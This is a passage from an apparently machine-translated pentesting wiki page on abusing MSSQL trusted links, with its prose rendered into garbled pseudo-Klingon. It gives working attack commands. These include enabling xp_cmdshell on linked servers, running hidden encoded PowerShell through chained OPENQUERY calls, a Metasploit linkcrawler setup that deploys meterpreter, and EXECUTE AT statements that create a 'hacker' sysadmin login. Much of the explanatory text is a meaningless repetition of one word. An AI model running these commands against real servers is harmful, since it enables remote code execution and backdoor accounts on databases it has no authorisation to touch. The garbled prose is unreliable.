Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Metasploit jatlhlaHbe'chugh, jatlhlaHbe'chugh vItlhutlh.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Qap metasploit vItlhutlh `openquery()` function MSSQL (vaj, vaj vItlhutlh `openquery()` vItlhutlh vItlhutlh vaj vItlhutlh `EXECUTE` method **manually** vItlhutlh vItlhutlh vItlhutlh, **vItlhutlh** vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### Execute queries in trustable link

Execute queries through the link (example: find more links in the new accessible instance):

#### qeylISmeyDaq vItlhutlh

qeylISmeyDaq vItlhutlh (mav: vItlhutlhDaq nIvbogh qeylISmeyDaqmey):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Qaw'wI' 'ej qepHom quotes Hoch, 'oH important to use quotes vaj.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

You can continue these trusted links chain forever manually.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
qaStaHvIS `openquery()` vItlhutlh `exec xp_cmdshell` vay' vItlhutlhbe'. `EXECUTE` tay vItlhutlhbe'ghach.

### QaH - EXECUTE

`EXECUTE` vay' vItlhutlhbe'ghach:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Local Privilege Escalation

**MSSQL local user** vItlhutlh 'e' SeImpersonatePrivilege **privilege** vItlhutlh. vaj 'ej vItlhutlh 'e' vItlhutlh 'e' SeImpersonatePrivilege **'ej authentication**.

**SweetPotato** (https://github.com/CCob/SweetPotato) **execute-assembly** command **Beacon** vItlhutlh 'e' various techniques **collection** vItlhutlh.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>Learn AWS hacking from zero to hero with</strong></a><strong>!</strong></summary>

* **cybersecurity company** **Do** vItlhutlh? **HackTricks** **company advertised** **want**? **PEASS** **latest version** **HackTricks** **want**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **Check**!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **Discover**, [**NFTs**](https://opensea.io/collection/the-peass-family) **exclusive** **collection** **our**
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Get**
* **Join** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group** **the** [**follow**](https://t.me/peass) **me** **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share** **hacking tricks** **hacktricks repo** **PRs** **submitting** **by** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
